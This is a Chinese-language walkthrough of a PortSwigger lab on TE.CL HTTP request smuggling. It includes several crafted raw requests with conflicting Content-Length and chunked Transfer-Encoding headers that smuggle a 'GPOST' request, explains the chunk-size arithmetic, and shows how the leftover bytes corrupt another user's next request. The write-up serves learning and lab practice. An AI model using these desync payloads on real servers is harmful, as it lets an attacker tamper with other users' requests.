本實驗涉及前端和後端服務器，後端服務器不支持分塊編碼。 前端服務器拒絕不使用 GET 或 POST 方法的請求。

解決實驗室，偷偷向後端服務器發送一個請求，讓後端服務器處理的下一個請求出現使用GPOST方法。

hint:
在請求走私攻擊中手動修復長度字段可能很棘手。 我們的 HTTP Request Smuggler Burp 擴展旨在提供幫助。 您可以通過 BApp Store 安裝它。
筆記

本實驗旨在演示 HTTP 請求走私背後的基本概念。 如果您繼續關注我們的學習材料，我們還有更多的實驗室可以教您如何利用這些漏洞進行一些高嚴重性攻擊。




這題是:

proxy 接受 TE

server 接受 CL

先定義TE

抓包送到repeater 把 update Content-Length 選項關了。
我們不要它自動更新數據長度



這題我在Transfer-Encoding: chunked 的計算已經算是大師了。

```http
POST / HTTP/1.1
Host: 0a76004c04aab6ecc0151cd000fe0039.web-security-academy.net
Cookie: session=ZxScVOqwvckYkAzZle4x4ipm8RYgic0H
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

16
GPOST / HTTP/1.1

11
0


```

關鍵:
每個chunk = data + \\r\\n 
結尾chunk = 0+\\r\\n\\r\\n

定義:
0x16 = 22 也就是說這個chunk 的資料是22 bytes 


1.GPOST / HTTP/1.1 長度為 16 + \\r\\n (結尾)  長度 18

2.空行 = \\r\\n  長度 2

3.捕2個1  長度 2 。(現在總長度為22)

4. 也就是 data 塊已經完成了， 但結尾要加上\\r\\n  才算是一個chunk ( 剛好是一個換行 )

5. 0 作為結尾chunk後面必須加上\\r\\n\\r\\n

6.所以要換行兩次。


也可以這樣，如果看懂前面絕對可以理解。
```http
POST / HTTP/1.1
Host: 0a50009d039fe628c0ea048100e000c2.web-security-academy.net
Cookie: session=6JhQFMepcUtQOu1xu6PPhTTYoHzx9sLI
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

16
GPOST / HTTP/1.1
空行
空行
空行
0


```


但是可別這樣:
因為 通常header 跟數據是要一個空行做區別的，你這樣去提交會失敗。
```http
POST / HTTP/1.1
Host: 0a50009d039fe628c0ea048100e000c2.web-security-academy.net
Cookie: session=6JhQFMepcUtQOu1xu6PPhTTYoHzx9sLI
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

16
GPOST / HTTP/1.1
11

0


```



最後講解一下資料傳輸邏輯:
```http
POST / HTTP/1.1
Host: 0a50009d039fe628c0ea048100e000c2.web-security-academy.net
Cookie: session=6JhQFMepcUtQOu1xu6PPhTTYoHzx9sLI
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

16
GPOST / HTTP/1.1
空行
空行
空行
0


```

前端 proxy 是 吃 Transfer-Encoding: chunked 這個 header

也就是說整個數據包可以完整的通過 proxy

proxy 把這個包 -> server

server 是吃 Content-Length: 4

它認為data 只有 4bytes 

也就是  1 6 \\r \\n 這4個。

所以後面的數據卡在了server 記憶體中:
```http
GPOST / HTTP/1.1
空行
空行
空行
0

```

下一次有人發出get 請求
就會變成這樣:
```http

GPOST / HTTP/1.1
空行
空行
空行
0

GET / HTTP/1.1
Host: 0a50009d039fe628c0ea048100e000c2.web-security-academy.net
Cookie: session=6JhQFMepcUtQOu1xu6PPhTTYoHzx9sLI
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://portswigger.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Te: trailers
Connection: close


```

於是走私了一個數據包，發出了一個GPOST 請求。伺服器會先處理 GPOST